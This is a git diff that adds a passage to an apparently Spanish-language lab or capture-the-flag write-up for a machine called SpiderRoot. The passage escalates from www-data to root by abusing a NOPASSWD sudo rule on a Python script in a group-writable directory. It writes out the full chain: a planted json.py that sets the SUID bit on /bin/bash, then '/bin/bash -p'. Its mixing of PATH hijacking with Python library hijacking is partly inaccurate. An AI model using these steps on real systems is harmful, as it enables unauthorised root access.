@@ -325,7 +325,66 @@ stty rows 51 columns 237
 
 
 
+Una vez dentro como usuario `www-data` vamos a comprobar los grupos a los que pertenecemos y si tenemos privilegios sudo
+```bash
+id
+sudo -l
+```
 
 
+![Nmap Scan](images/SpiderRoot/21.png)
 
+
+Vemos dos cosas interesantes:
+
+
+1- pertenecemos al grupo `spiderlab`
+
+2- podemos ejecutar con privilegios sudo (ALL) NOPASSWD: /usr/bin/python3 /opt/spidy.py
+
+
+Comprobamos los permisos del script y de la carpeta que lo aloja:
+```
+ls -la /opt/spidy.py
+ls -la /opt
+```
+
+el script es propietario root pero atención la carpeta donde se aloja tiene estos permisos:
+```
+Detalle de los permisos: drwxrwxr-x
+
+d → indica que es un directorio.
+
+rwx → permisos del propietario (root): puede leer, escribir y ejecutar.
+
+rwx → permisos del grupo (spiderlab): puede leer, escribir y ejecutar.
+
+r-x → permisos otros (everyone else): puede leer y ejecutar, pero no escribir.
+```
+
+![Nmap Scan](images/SpiderRoot/22.png)
+
+
+vamos a ver el script con `cat /opt/spidy.py`
+
+![Nmap Scan](images/SpiderRoot/23.png)
+
+Es un script en python y se me ocurre hacer un Path Hijacking y Library Hijacking
+
+1- cambiamos el PATH `export PATH=$(pwd):$PATH`
+2- el path lee primero en el directorio actual y creo un script con el nombre json.py que contenga:
+
+```
+import os
+
+os.system("chmod u+s /bin/bash")
+```
+
+3- ejecuto el script `sudo /usr/bin/python3 /opt/spidy.py`
+
+4- compruebo privilegios de la /bin/bash y veo que tiene el bit suid
+
+5- ejecuto `/bin/bash -p` y me convierto en root
+
+![Nmap Scan](images/SpiderRoot/24.png)
 
